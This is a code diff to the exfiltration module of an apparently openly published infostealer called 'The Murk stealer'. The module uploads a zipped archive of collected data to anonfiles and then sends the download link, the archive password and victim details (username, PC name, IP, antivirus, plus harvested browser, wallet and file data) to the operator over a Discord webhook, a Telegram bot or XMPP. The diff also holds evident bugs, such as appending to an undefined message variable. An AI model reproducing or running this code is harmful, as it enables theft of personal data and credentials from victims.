@@ -9,34 +9,33 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-from discord_webhook import DiscordWebhook
-from anonfile import AnonFile
-import requests
-import xmpp
-import os
+from requests import post, get
+from os import remove
 
 
 def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData):
-
+	if type == 2:
+		from xmpp import protocol,Client
+	if type == 0:
+		from discord_webhook import DiscordWebhook
+		
+		
 	try:
+		
+		num = np[0].rfind("\\")
+		name = np[0][num+1:]
+		arr = open(rf'{np[0]}.zip', 'rb')
+		files = {
+    		'file': (f'{name}.zip', arr),
+		}
+		url = 'https://api.anonfiles.com/upload'
+		response = post(url, files=files)
+		dataMain = response.json()
+		url = dataMain['data']['file']['url']['short']
+		arr.close()
+
 		try:
-			file = AnonFile()
-			uploadedFile = file.upload(rf'{np[0]}.zip')
-			url = uploadedFile.url.geturl()
-		except:
-			num = np[0].rfind("\\")
-			name = np[0][num+1:]
-			arr = open(rf'{np[0]}.zip', 'rb')
-			files = {
-    			'file': (f'{name}.zip', arr),
-			}
-			url = 'https://api.anonfiles.com/upload'
-			response = requests.post(url, files=files)
-			data = response.json()
-			url = data['data']['file']['url']['short']
-			arr.close()
-		try:
-			os.remove(f'{np[0]}.zip')
+			remove(f'{np[0]}.zip')
 		except Exception as e:
 			print(e)
 		print(url)
@@ -45,24 +44,48 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData)
 			if type == 0:
 				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█ 　 █▀▀█ █▀▀ █▀▀ █──█ █── ▀▀█▀▀ █▀▀\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ 　 █▄▄▀ █▀▀ ▀▀█ █──█ █── ──█── ▀▀█\n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀ 　 ▀─▀▀ ▀▀▀ ▀▀▀ ─▀▀▀ ▀▀▀ ──▀── ▀▀▀\n[Link🔗]({url})\nPassword: ||{np[1]}||\n\n>>> **Collected data**"
 			if type == 1 or type == 2:
-				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ \n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀\nLink🔗:{url}\nPassword: {np[1]}\n\n⇓Collected data⇓"
-			message = f"{title}"+f'\n⏲Date: {data[0]}\n🖥System: {data[1]}\n👤PCname: {data[2]}\n👤Username: {data[3]}\n🔧CPU: {data[4]}\n🔧GPU: {data[5]}\n📡IP: {data[6]}\n🛡Antivirus: {data[7]}'
+				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ \n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀\nLink🔗:{url}\nPassword: {np[1]}\n\n⇓Collected data⇓"			
+			message += f"{title}"
+			try:
+				message += f'\n⏲Date: {data[0]}'
+				message += f'\n🖥System: {data[1]}'
+				message += f'\n👤PCname: {data[2]}'
+				message += f'\n👤Username: {data[3]}'
+				message += f'\n🔧CPU: {data[4]}'
+				message += f'\n🔧GPU: {data[5]}'
+				message += f'\n📡IP: {data[6]}'
+				message += f'\n🛡Antivirus: {data[7]}'
+			except Exception as e:
+				print(e)
+		except Exception as e:
+				print(e)
+		try:
 			if dataB:
 				for text in dataB:
 					message+= text
 			message+="\n\n🎰Other"
+
+		except Exception as e:
+			print(e)
+		try:
 			if dataO:
 				for text in dataO:
 					message+= text
+		except Exception as e:
+			print(e)
+		try:
 			if dataW:
 				for text in dataW:
 					message+= text
+		except Exception as e:
+			print(e)
+		try:
 			if dataF:
 				for text in dataF:
 					message+= text
 		except Exception as e:
 			print(e)
-			message+=f"data error:{e}\nLink🔗:{url}\nPassword: {np[1]}"
+		print("send")
 		try:
 			if type == 0:
 				urlWebHook = discordData[0] # url of your WebHook
@@ -79,17 +102,17 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData)
     				'chat_id': ID,
     				'text': message,
 				}
-				response = requests.get('https://api.telegram.org/bot'+Token+'/sendMessage', params=params)
+				response = get('https://api.telegram.org/bot'+Token+'/sendMessage', params=params)
 			if type == 2:
 				jabberid = xmppData[0]
 				jabberpassword = xmppData[1]
 				jabberreceiver = xmppData[2]
 				message+="\n\n\nThe Murk|by Nick Vinesmoke"
-				jid = xmpp.protocol.JID(jabberid)
-				connection = xmpp.Client(server=jid.getDomain())
+				jid = protocol.JID(jabberid)
+				connection = Client(server=jid.getDomain())
 				connection.connect()
 				connection.auth(user=jid.getNode(), password=jabberpassword, resource=jid.getResource())
-				connection.send(xmpp.protocol.Message(to=jabberreceiver, body=message))
+				connection.send(protocol.Message(to=jabberreceiver, body=message))
 		except Exception as e:
 			print(e)
 	except Exception as e:
